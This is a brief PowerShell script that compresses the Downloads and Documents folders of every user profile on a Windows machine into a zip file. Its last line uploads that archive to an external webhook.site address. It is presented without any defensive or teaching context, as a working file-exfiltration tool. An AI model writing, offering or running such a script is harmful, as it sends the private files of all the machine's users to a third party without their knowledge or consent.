# Define the destination zip file
$zipFile = "C:\Temp\UsersData.zip"

# Create a new empty zip file
Add-Type -AssemblyName System.IO.Compression.FileSystem
[IO.Compression.ZipFile]::CreateFromDirectory("C:\Temp\EmptyFolder", $zipFile)

# Loop through each user profile to find the Downloads and Documents folders
$users = Get-ChildItem "C:\Users" -Directory
foreach ($user in $users) {
    $downloadsFolder = Join-Path $user.FullName "Downloads"
    $documentsFolder = Join-Path $user.FullName "Documents"
    if ((Test-Path $downloadsFolder) -and (Test-Path $documentsFolder)) {
        # Add the Downloads and Documents folders to the zip file
        Compress-Archive -Path $downloadsFolder, $documentsFolder -Update -DestinationPath $zipFile
    }
}

(New-Object System.Net.WebClient).UploadFile("https://webhook.site/138caf52-ee90-4162-a0e3-1d6d140a967d",'C:\Temp\UsersData.zip');
